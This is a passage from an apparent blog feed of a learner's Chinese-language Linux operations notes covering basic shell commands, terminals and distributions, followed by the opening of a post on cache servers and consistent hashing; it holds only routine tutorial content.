                <img src="http://omunhj2f1.bkt.clouddn.com/71E63EACCC43D61DD775979F71B4F853.jpg" alt="71E63EACCC43D61DD775979F71B4F853.jpg" title="" class="">
                <p>71E63EACCC43D61DD775979F71B4F853.jpg</p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 文件系统&amp;操作 bash基础特性 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux运维学习Day2]]></title>
      <url>/2017/08/15/Linux%E8%BF%90%E7%BB%B4%E5%AD%A6%E4%B9%A0Day2/</url>
      <content type="html"><![CDATA[<p>接着第一天的继续完善基础的知识吧！</p>
<a id="more"></a>
<h1 id="Linux运维学习Day2"><a href="#Linux运维学习Day2" class="headerlink" title="Linux运维学习Day2"></a>Linux运维学习Day2</h1><h2 id="计算机基础知识"><a href="#计算机基础知识" class="headerlink" title="计算机基础知识"></a>计算机基础知识</h2><blockquote>
<p>CPU、Memory、I/O</p>
<p>— |程序运行模式：</p>
<p>—— |用户空间：user space ,us</p>
<p>—— |内核空间：system space</p>
<p>— |POS:Portable Operating System. 可移植操作系统</p>
<p>—— |POSIX：可移植操作系统接口，是定义API的一系列互相关联的标准总称</p>
<p>— |运行系统格式</p>
<p>—— |Windows：EXE 、 dll</p>
<p>—— |Linux :ELF，so(shared object)</p>
<p>—— |程序：指令 + 数据</p>
<p>——— | 指令： 只读</p>
<p>——— | 数据：读写</p>
<p>—— |程序：算法 + 数据结构</p>
<p>—— |编程语言：</p>
<p>——— |汇编语言：微码编程，系统中和硬件相关的特有代码，驱动程序开发</p>
<p>——— |高级语言C、C++：系统级应用、驱动程序</p>
<p>——— |高级应用java、python、PHP：应用程序</p>
</blockquote>
<p>Linux 的主要发行版本有</p>
<blockquote>
<p><code>slackware</code></p>
<blockquote>
<p>suse</p>
<blockquote>
<p>Opensuse</p>
</blockquote>
</blockquote>
<p><code>Debian</code></p>
<blockquote>
<p>ubuntu</p>
<blockquote>
<p>mint</p>
</blockquote>
</blockquote>
<p><code>redhat</code></p>
<blockquote>
<p>rhel:企业版，每十八个月发新一个版本</p>
<p>fedora：每六个月发行一版本</p>
<p>Centos:兼容rhel的格式，除了界面不一样</p>
</blockquote>
</blockquote>
<p>可以参考,还有一些非主流发行版比如说Gentoo、LFS(Linux From scratch)，Android也能算是linux的发行版本，就是kernel+<a href="https://zh.wikipedia.org/wiki/BusyBox" target="_blank" rel="external"> busybox</a>+java虚拟机。<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/gldt1210.png" alt="gldt1210.png" title="" class="">
                <p>gldt1210.png</p>
            </figure></p>
<p><a href="http://www.ha97.com/833.html" target="_blank" rel="external">开源协议及其比较</a></p>
<p>程序包管理器:</p>
<p>​        rpm:rhel fedora suse centos</p>
<p>​    dpt(debian packge tool): Debian ubuntu</p>
<p>Linux的哲学思想：</p>
<p>1.一切皆文件，把几乎所有的资源，包括硬件设备都组织为文件格式</p>
<p>2.有众多的单一目的的小程序组成，一个程序只实现一个功能，而且要做好，组合小程序完成复杂任务</p>
<p>3.尽量避免跟用户交互，目标：实现脚本编程，自动完成某些功能</p>
<p>4.使用纯文本文件保存配置信息，目标：使用文本编辑器即能完成系统配置工作</p>
<p>镜像站点推荐<a href="http://mirrors.aliyun.com/" target="_blank" rel="external">阿里云</a>、<a href="http://mirrors.souhu.com" target="_blank" rel="external">搜狐</a></p>
<h2 id="计算机基础知识（二）"><a href="#计算机基础知识（二）" class="headerlink" title="计算机基础知识（二）"></a>计算机基础知识（二）</h2><p>终端：用户与主机交互，必然用到的设备</p>
<blockquote>
<p>物理终端：直接接入本机的显示器和键盘设备：console</p>
<p>虚拟终端：附加在物理终端之上的以软件方式虚拟实现的终端，centos默认6个终端</p>
<p>模拟终端：图形界面下打开的命令行接口，基于ssh协议或telnet协议远程打开的界面</p>
<p>设备文件：/dev/pts/# [0,+∞]</p>
</blockquote>
<p>查看当前的终端设备:tty命令</p>
<p>从图形化切换到命令行，可以使用:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">init 2/3</div></pre></td></tr></table></figure>
<p>转换回图形化的时候使用命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">init 5</div></pre></td></tr></table></figure>
<p>交互式接口：启动终端后，在终端设备附加一个交互式应用程序</p>
<p>GUI:</p>
<blockquote>
<p>X protocol ， window manager ， desktop</p>
<blockquote>
<p>Desktop:GNOME(c,gtk图形开发库)、KDE(c++，qt图形开发库)、XFCE(轻量级桌面)</p>
</blockquote>
</blockquote>
<p>CLI：</p>
<blockquote>
<p>Shell程序：sh、bash(遵从GPL协议)、csh(接近于C语言风格的shell)、ksh、zsh</p>
</blockquote>
<p>使用当前使用的shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">echo $SHELL</div></pre></td></tr></table></figure>
<p>显示当前系统支持的所有shell</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">cat /etc/shells</div></pre></td></tr></table></figure>
<p>在shell中的可执行命令有两类：</p>
<blockquote>
<p>内建命令：通过某命令形式提供</p>
<p>外部命令：当前系统的某目录下存放的对应可执行二进制文件</p>
</blockquote>
<p>区别内部和外部命令：<code>type xxx</code></p>
<p>运行命令的格式：</p>
<p><code>COMMAND [OPTIONS… ] [Arguments..]</code></p>
<blockquote>
<p>选项：用于开启或者关闭某些功能</p>
<blockquote>
<p>短选项：-c</p>
<p>长选项：–word</p>
</blockquote>
<p>参数：命令的作用对象，向命令提供数据</p>
</blockquote>
<h2 id="Linux命令"><a href="#Linux命令" class="headerlink" title="Linux命令"></a>Linux命令</h2><h3 id="工欲善其事，必先利其器，首先就来看看怎么更快的上手命令吧"><a href="#工欲善其事，必先利其器，首先就来看看怎么更快的上手命令吧" class="headerlink" title="工欲善其事，必先利其器，首先就来看看怎么更快的上手命令吧"></a>工欲善其事，必先利其器，首先就来看看怎么更快的上手命令吧</h3><p>文件系统：</p>
<p>文件有两类数据，一种叫做元数据：metadata（存放在索引中），数据：data（文件真正包含的内容）</p>
<p>命令获取帮助</p>
<p>内部命令：<code>help command</code></p>
<p>外部命令：<code>command --help</code>、<code>man command</code>、<code>info command</code></p>
<p>hash命令：shell搜寻到的外部命令会缓存至kv(key-value)存储中</p>
<p>history命令：登陆shell时，会读取命令历史文件中记录下的命令：~/.bash_history，登陆进shell后执行的命令只会记录在缓存中，这些命令会在用户退出的时候”追加”到命令历史文件中</p>
<table>
<thead>
<tr>
<th>-a</th>
<th>追加本次会话新执行的命令历史列表到历史文件中</th>
</tr>
</thead>
<tbody>
<tr>
<td>-d</td>
<td>删除历史中指定的命令，如:history -d 40</td>
</tr>
<tr>
<td>-c</td>
<td>清空命令历史</td>
</tr>
</tbody>
</table>
<p>快捷操作</p>
<table>
<thead>
<tr>
<th>!#</th>
<th>调用历史中的第#条命令</th>
</tr>
</thead>
<tbody>
<tr>
<td>!string</td>
<td>调用历史中最近一个以string开头的命令</td>
</tr>
<tr>
<td>!!</td>
<td>上一条命令</td>
</tr>
</tbody>
</table>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/2CD6B9BF918F0F2CA30546E568B8F2BE.jpg" alt="2CD6B9BF918F0F2CA30546E568B8F2BE.jpg" title="" class="">
                <p>2CD6B9BF918F0F2CA30546E568B8F2BE.jpg</p>
            </figure>
<p><img src="http://omunhj2f1.bkt.clouddn.com/6B77F5F6-E55D-4963-A2E1-B9C185FBC40E.png" alt="6B77F5F6-E55D-4963-A2E1-B9C185FBC40E.png"></p>
<p>程序自身的帮助文档：/usr/share/doc/COMMAND-VERSION,或者查看官方文档</p>
<p>推荐一个网站，<a href="https://www.slideshare.net/" target="_blank" rel="external">需先翻墙再使用</a></p>
<h3 id="接下来就是一些基础的命令讲解"><a href="#接下来就是一些基础的命令讲解" class="headerlink" title="接下来就是一些基础的命令讲解"></a>接下来就是一些基础的命令讲解</h3><p><code>date</code>命令使用：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/D8911B61C1A277643C894624ECB1A171.jpg" alt="D8911B61C1A277643C894624ECB1A171.jpg" title="" class="">
                <p>D8911B61C1A277643C894624ECB1A171.jpg</p>
            </figure>
<p>e.g.-&gt;:<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-19%20%E4%B8%8B%E5%8D%8812.34.54.png" alt="屏幕快照 2017-07-19 下午12.34.54.png" title="" class="">
                <p>屏幕快照 2017-07-19 下午12.34.54.png</p>
            </figure></p>
<p>Linux的两种时钟：</p>
<blockquote>
<p>系统时钟：由Linux内核通过CPU工作频率进行的计时</p>
<p>硬件时钟：主板上由电池供电的时钟</p>
</blockquote>
<p><code>hwclock</code>：显示硬件时钟</p>
<table>
<thead>
<tr>
<th>-s</th>
<th>–hctosys</th>
</tr>
</thead>
<tbody>
<tr>
<td>-w</td>
<td>–systohc</td>
</tr>
</tbody>
</table>
<p>关于ls命令：</p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/E2F2AAF76EE99590341C80F28AF90A07.jpg" alt="E2F2AAF76EE99590341C80F28AF90A07.jpg" title="" class="">
                <p>E2F2AAF76EE99590341C80F28AF90A07.jpg</p>
            </figure>
<p>获取指定文件的元数据信息可用<code>stat</code>命令：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">stat test</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-19%20%E4%B8%8B%E5%8D%881.27.39.png" alt="屏幕快照 2017-07-19 下午1.27.39.png" title="" class="">
                <p>屏幕快照 2017-07-19 下午1.27.39.png</p>
            </figure>
<p>文件查看命令：<code>cat</code>、<code>tac</code></p>
<p>cat命令是通过你键入的文件路径来显示文件，事实上文件是以文件流的方式存储的，一个换行符是$，一个空格是$$，如果你的cat命令后面没有键入任何的路径，那么默认就会读取你之后输入的信息输出，就像一个复读机一样，是不是突然变的有意思了么？<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-19%20%E4%B8%8B%E5%8D%881.43.40.png" alt="屏幕快照 2017-07-19 下午1.43.40.png" title="" class="">
                <p>屏幕快照 2017-07-19 下午1.43.40.png</p>
            </figure></p>
<table>
<thead>
<tr>
<th>-E</th>
<th>显示行结束符$</th>
</tr>
</thead>
<tbody>
<tr>
<td>-n</td>
<td>对显示的每一行编号</td>
</tr>
</tbody>
</table>
<p>文件内容查看命令:file</p>
<p><code>which</code>:显示命令对应的程序文件路径</p>
<p><code>whereis</code>：显示的比which更加详细，包括手册的位置等</p>
<p><code>whatis</code> :使用<code>mkwhatis</code>命令可以将当前系统上所有的帮助手册和与之对应的关键字创建为一个数据库：</p>
<h3 id="然后进入到系统管理类命令"><a href="#然后进入到系统管理类命令" class="headerlink" title="然后进入到系统管理类命令"></a>然后进入到系统管理类命令</h3><p>关机命令：<code>shutdown</code>、<code>halt(关机且不会重启)</code>、<code>poweroff</code>、<code>init 0</code></p>
<p>重启命令：<code>reboot</code>、 <code>shutdown</code>、 <code>init 6</code></p>
<p>用户登录相关：<code>whoami</code>、 <code>who</code>、 <code>w</code></p>
]]></content>
      
        <categories>
            
            <category> 命令帮助 终端、虚拟机使用 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Linux运维学习Day1]]></title>
      <url>/2017/08/15/Linux%E8%BF%90%E7%BB%B4%E5%AD%A6%E4%B9%A0Day1/</url>
      <content type="html"><![CDATA[<p>第一天首先了解一下Linux命令的基本格式&amp;操作系统和软硬件之间的联系</p>
<a id="more"></a>
<h1 id="Linux运维学习Day1"><a href="#Linux运维学习Day1" class="headerlink" title="Linux运维学习Day1"></a>Linux运维学习Day1</h1><h2 id="Linux命令的格式："><a href="#Linux命令的格式：" class="headerlink" title="Linux命令的格式："></a>Linux命令的格式：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">command [-option] [parameters] ...</div><div class="line">e.g-&gt;mike@mike:~$ ls -a /home/mike</div></pre></td></tr></table></figure>
<h2 id="ls命令-list的简写-：列出当前目录下的文件和文件夹"><a href="#ls命令-list的简写-：列出当前目录下的文件和文件夹" class="headerlink" title="ls命令(list的简写)：列出当前目录下的文件和文件夹"></a>ls命令(list的简写)：列出当前目录下的文件和文件夹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">e.g：</div><div class="line">pzp@ubuntu:/home$ ls</div><div class="line">cpp  python</div><div class="line">pzp@ubuntu:/home$ ls -l</div><div class="line">drwxr-xr-x 2 cpp YYY 4096 10月 13 09:58 cpp</div><div class="line">-rw-rw-r 1 python python 18 10月 12 18:47 dump.rdb </div><div class="line">pzp@ubuntu:/home$ ls -a</div><div class="line">. .. cpp  python</div></pre></td></tr></table></figure>
<blockquote>
<p>1.ls -l是列出详细的信息，如果前面是以’-‘开头的就是文件，如果是’d’开头则是文件夹。</p>
<p>2.ls -a则是列出所有的文件包括隐藏的文件和文件夹。</p>
<p>3.ls [路径]是列出选择的路径下的文件和文件夹。</p>
<p>4.ls -l命令所列出的信息中时间前的那一串数字表示的其所占的内存大小是多少k。</p>
</blockquote>
<h2 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h2><p>返回当前文件夹的路径</p>
<h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2><p>切换目录</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">e.g:</div><div class="line">cd ..  #返回上一目录</div><div class="line">cd ./xxx/ #进入本目录下的xxx文件夹</div><div class="line">cd /xxx/xxx #使用绝对路径</div><div class="line">cd xxx #使用相对路径</div><div class="line">cd - #进入上次所在的目录</div><div class="line">cd ~ #切换回主目录</div></pre></td></tr></table></figure>
<h2 id="clear命令"><a href="#clear命令" class="headerlink" title="clear命令"></a>clear命令</h2><p>清空屏幕，但其实之前的命令还有保留，上滑就能看到。</p>
<h2 id="tab命令"><a href="#tab命令" class="headerlink" title="tab命令"></a>tab命令</h2><p>当文件或者文件夹名字过长的时候，可以使用tab键来进行补全。</p>
<h2 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h2><p>创建一个文件。</p>
<h2 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h2><p>当文件中的信息很多时，可以采用more来分屏显示,通过空格键往下：more text.txt</p>
<h2 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h2><p>显示出该文件的所有内容：cat text.txt</p>
<p>合并两个文件为一个文件：cat test1.txt test2.txt &gt; test3.txt(先将两个文件合并再重定向到一个新的文件)</p>
<h2 id="创建和删除文件夹"><a href="#创建和删除文件夹" class="headerlink" title="创建和删除文件夹"></a>创建和删除文件夹</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">mkdir  xxx  #创建文件夹</div><div class="line"></div><div class="line">rmdir  xxx #只允许删除空文件夹</div><div class="line"></div><div class="line">rm xxx  #删除文件</div><div class="line"></div><div class="line">rm xxx -r #递归删除，删除文件夹必加&apos;-r&apos;参数</div><div class="line"></div><div class="line">rm xxx -f #强制删除</div></pre></td></tr></table></figure>
<h2 id="命令查询"><a href="#命令查询" class="headerlink" title="命令查询"></a>命令查询</h2><p>当你不清楚某个命令的用法的时候，可以通过查询命令来了解：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">man ls</div><div class="line">ls --help</div></pre></td></tr></table></figure>
<p>其中的man是manual的缩写，意为手册，其中第一节的手册是对标准命令的查询，一共有八节手册.<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/98C2E462-1760-4807-95AB-C670BD50E5D7.png" alt="各个section的意义" title="" class="">
                <p>各个section的意义</p>
            </figure></p>
<h2 id="通配标识符"><a href="#通配标识符" class="headerlink" title="通配标识符"></a>通配标识符</h2><h4 id="通过通配标识符可以对文件进行快速查找："><a href="#通过通配标识符可以对文件进行快速查找：" class="headerlink" title="通过通配标识符可以对文件进行快速查找："></a>通过通配标识符可以对文件进行快速查找：</h4><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/42447C4B-1C85-474A-A30A-7455CAB83C5F.png" alt="通配标识符" title="" class="">
                <p>通配标识符</p>
            </figure>
<p>e.g-&gt;ls xxx*.x意为对名称中含有xxx,后缀为.x的文件开始快速查询。</p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><p>Linux允许将命令执行结果重定向到一个文件，本应显示在终端上的内容保存到指定文件中。<strong>e.g</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ls &gt; text.txt #test.txt如果不存在，则创建，存在则覆盖其内容</div><div class="line">ls &gt;&gt; text.txt #test.txt不存在同上，反之在保留原始内容同时加上新内容</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/4CD429FD-7601-40BB-9A58-97A3325527F1.png" alt="重定向" title="" class="">
                <p>重定向</p>
            </figure>
<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><p>管道：一个命令输出可以作为另一个命令的输入。</p>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/D17B61C5-27E4-4EB8-BC85-CB13DB90C69E.png" alt="管道" title="" class="">
                <p>管道</p>
            </figure>
<h2 id="软链接和硬链接"><a href="#软链接和硬链接" class="headerlink" title="软链接和硬链接"></a>软链接和硬链接</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">软链接： ln -s 源文件 链接名 #删除原文件之后失效</div><div class="line"></div><div class="line">硬链接： ln 源文件 链接名  #相当于给该文件多加了一个名字，删除原文件之后链接依旧有效</div></pre></td></tr></table></figure>
<p>在linux中一个文件可以有多个文件名，将文件删除的时候如果该文件有多个名字，首先删除的是这个名字，当最后一个名字被删除后，才会删除文件。</p>
<h2 id="文本搜索命令"><a href="#文本搜索命令" class="headerlink" title="文本搜索命令"></a>文本搜索命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">grep  &apos;关键词&apos;  文本  </div><div class="line">grep -n &apos;关键词&apos; 文本  #搜索之后分行显示</div><div class="line">grep -n &apos;^关键词&apos; 文本 #搜索以关键词为开头分行显示</div><div class="line">grep -n &apos;关键词$&apos; 文本 #搜索以关键词为结尾分行显示</div><div class="line">grep &apos;[Ss]igna[Ll]&apos; 文本 #搜索匹配【】里中一系列字符中的一个</div></pre></td></tr></table></figure>
<h2 id="文件搜索命令"><a href="#文件搜索命令" class="headerlink" title="文件搜索命令"></a>文件搜索命令</h2><figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/29C178A5-18B9-4BD9-984F-2734274B6873.png" alt="" title="" class="">
                <p></p>
            </figure>
<p><strong>可以配合通配标识符使用，搜索会更加便捷</strong>。</p>
<h2 id="拷贝文件和移动文件"><a href="#拷贝文件和移动文件" class="headerlink" title="拷贝文件和移动文件"></a>拷贝文件和移动文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">cp 文件或文件夹  文件夹 #前者是被拷贝方，后者是拷贝方</div><div class="line"></div><div class="line">mv 文件或文件夹  文件夹 #同上</div></pre></td></tr></table></figure>
<table>
<thead>
<tr>
<th>参数表</th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>-i</td>
<td>交互式拷贝</td>
</tr>
<tr>
<td>-r</td>
<td>递归式拷贝</td>
</tr>
<tr>
<td>-f</td>
<td>强制拷贝</td>
</tr>
<tr>
<td>-v</td>
<td>显示拷贝进度</td>
</tr>
</tbody>
</table>
<h2 id="重命名"><a href="#重命名" class="headerlink" title="重命名"></a>重命名</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mv 文件名 文件名</div></pre></td></tr></table></figure>
<h2 id="压缩和解压缩（-gz格式）"><a href="#压缩和解压缩（-gz格式）" class="headerlink" title="压缩和解压缩（.gz格式）"></a>压缩和解压缩（.gz格式）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">tar -cvf  xxx.tar 压缩文件1 压缩文件2..... #打包</div><div class="line">gzip xxx.tar  #压缩</div><div class="line">gzip -d  xxx.tar.gz  #解压缩</div><div class="line">tar -xvf xxx.tar #解包</div><div class="line">tar -zcvf xxx.tar.gz 压缩文件1 压缩文件2..... #一键压缩</div><div class="line">tar -zxvf xxx.tar.gz -C 路径 #将文件一键解压到指定目录下</div></pre></td></tr></table></figure>
<h3 id="如果是-bz2格式的，只需要把参数里面的’z’改成’j’即可，其余不变。"><a href="#如果是-bz2格式的，只需要把参数里面的’z’改成’j’即可，其余不变。" class="headerlink" title="如果是.bz2格式的，只需要把参数里面的’z’改成’j’即可，其余不变。"></a>如果是.bz2格式的，只需要把参数里面的’z’改成’j’即可，其余不变。</h3><h3 id="如果是zip格式的："><a href="#如果是zip格式的：" class="headerlink" title="如果是zip格式的："></a>如果是zip格式的：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">zip -r 目标文件（没有扩展名） 源文件 #压缩文件</div><div class="line"></div><div class="line">unzip -d 解压缩后目录（如果没有则创建） 压缩文件  #解压文件</div></pre></td></tr></table></figure>
<figure class="image-box">
                <img src="http://omg5mjb8v.bkt.clouddn.com/F6B36FE5-F16B-4E20-9A81-AA322D95732A.png" alt="" title="" class="">
                <p></p>
            </figure>
<h2 id="搜索命令"><a href="#搜索命令" class="headerlink" title="搜索命令"></a>搜索命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">which ls</div></pre></td></tr></table></figure>
<h2 id="与系统相关的命令"><a href="#与系统相关的命令" class="headerlink" title="与系统相关的命令"></a>与系统相关的命令</h2><blockquote>
<p>1.查看当前日历：cal (月份)(年份)</p>
<p>2.显示时间或者设置时间：date MMDDhhmmCCYY.ss (CC为年的前两位，yy为后两位，MM为月，mm为分钟)</p>
<p>3.查看进程的信息：ps ，参数表参考<a href="http://jingyan.baidu.com/article/fec4bce2479f05f2618d8b80.html" target="_blank" rel="external">ps命令总结</a>，如果想结束一个无限循环的程序，可以另开一个窗口，用ps -aux找到这个进程的进程号（PID），就可以用kill 进程号来结束这个进程，如果有些进程无法被杀死，可以用kill -9 进程号。</p>
<p>4.动态显示进程：top 参数表参考<a href="http://www.cnblogs.com/taobataoma/archive/2007/12/26/1015167.html" target="_blank" rel="external">top命令详解</a></p>
<p>5.结束进程：kill 进程号，必要时可以使用kill -9 进程号</p>
<p>6.重启，关闭电脑：reboot(重启操作系统) shutdown<a href="http://www.vbgudu.com/html/20160624/51525.html" target="_blank" rel="external">参数表</a>  init 0(关机) init 6(重启)</p>
<p>7.检测磁盘空间的占用情况和空余情况：df</p>
<p>8.检测当前目录所占磁盘空间：du -a</p>
<p>9.查看或配置网卡信息：ifconfig</p>
</blockquote>
<p><img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-18%20%E4%B8%8A%E5%8D%889.00.38.png" alt="屏幕快照 2017-07-18 上午9.00.38.png"></p>
<figure class="image-box">
                <img src="http://omunhj2f1.bkt.clouddn.com/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202017-07-18%20%E4%B8%8A%E5%8D%889.14.55.png" alt="屏幕快照 2017-07-18 上午9.14.55.png" title="" class="">
                <p>屏幕快照 2017-07-18 上午9.14.55.png</p>
            </figure>
]]></content>
      
        <categories>
            
            <category> 基础预备知识 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[缓存服务器和一致性哈希]]></title>
      <url>/2017/08/13/%E7%BC%93%E5%AD%98%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E4%B8%80%E8%87%B4%E6%80%A7%E5%93%88%E5%B8%8C/</url>
      <content type="html"><![CDATA[<p>关于hash算法在服务器端的应用是怎么样的呢？<br><a id="more"></a></p>
<h1 id="缓存服务器和一致性哈希"><a href="#缓存服务器和一致性哈希" class="headerlink" title="缓存服务器和一致性哈希"></a>缓存服务器和一致性哈希</h1><h2 id="缓存服务器"><a href="#缓存服务器" class="headerlink" title="缓存服务器"></a>缓存服务器</h2><p>缓存服务器相对于一般服务器的作用就是提速，因为缓存服务器是直接从内存中读取数据，相对于从硬盘中读取数据，这个速度要快了至少十万倍。</p>
<p>那么缓存服务器相对于一般的服务器是如何优化的呢？</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//一般的提取数据方法</span></div><div class="line"><span class="keyword">var</span> data = Database.get(<span class="number">111</span>);  <span class="comment">// 从数据库拿数据，慢</span></div><div class="line"><span class="keyword">return</span> data;</div></pre></td></tr></table></figure>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//从缓存服务器中提取数据</span></div><div class="line"><span class="keyword">var</span> myAwesomeCache = &#123;&#125;;  <span class="comment">// 我们的缓存，只是内存中一个字典</span></div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">var data = myAwesomeCache[<span class="string">'111'</span>];  <span class="comment">// 先从内存拿，快</span></div><div class="line"><span class="keyword">if</span> (data != <span class="literal">null</span>) &#123;</div><div class="line">    <span class="keyword">return</span> data;  <span class="comment">// 有就直接用</span></div><div class="line">&#125;</div><div class="line"></div><div class="line">data = Database.get(<span class="string">'111'</span>);  <span class="comment">// 没有才从数据库拿</span></div><div class="line">myAwesomeCache[<span class="string">'111'</span>] = data;  <span class="comment">// 而且拿完记得加进缓存</span></div><div class="line"><span class="keyword">return</span> data;</div></pre></td></tr></table></figure>
<p>添加缓存前，由于每次请求都从数据库中拿数据，需要通过网络／磁盘，速度慢，数据库压力大。</p>
<p>现在将结果放在内存中做缓存，如果后面的请求命中了这个缓存，就能直接从内存中获取数据，而内存显然比网络／磁盘快的多。</p>
<p>通常来说内存虽然速度比磁盘快，但成本高，容量小。但是断电会失效。</p>
<h2 id="一致性哈希"><a href="#一致性哈希" class="headerlink" title="一致性哈希"></a>一致性哈希</h2><h3 id="负载均衡和哈希算法"><a href="#负载均衡和哈希算法" class="headerlink" title="负载均衡和哈希算法"></a>负载均衡和哈希算法</h3><p>分布式系统中（如：web存储），当服务增长到一定规模时，惯常的方法就是集群化，引入负载均衡，这样做的好处是：1.高可用。2.解耦。从外部看，透明了集群的内部细节（外部通过负载均衡服务器通信，然后由负载均衡服务器分发请求）。</p>
<p>假设有四个cache服务器组成的集群，当一个对象object传入集群时，这个对象应该存储到哪一个cache中呢？一种简单的方法就是用映射公式：</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Hash(object)<span class="comment">%4</span></div></pre></td></tr></table></figure>
<p>这个算法就可以保证任何object都会尽可能随机落在其中一个cache中。</p>
<p>然后考虑以下情况：</p>
<ul>
<li>由于流量增大，需要增加一台cache，这个时候，映射公式就变成<code>Hash(object)%5</code></li>
<li>有一台cache服务器down掉，这个时候，映射公式就变成<code>Hash(object)%3</code></li>
</ul>
<p>可见，无论是新增还是减少剪掉，都会改变映射公式，由于映射公式改变，几乎所有的object都会被object都会被映射到新的cache中，这意味着一时间所有的缓存都会全部失效。因为所有的缓存都要重新的分配</p>
<p>如要分配2，3，4，5四个数，首先对2取模：</p>
<figure class="image-box">
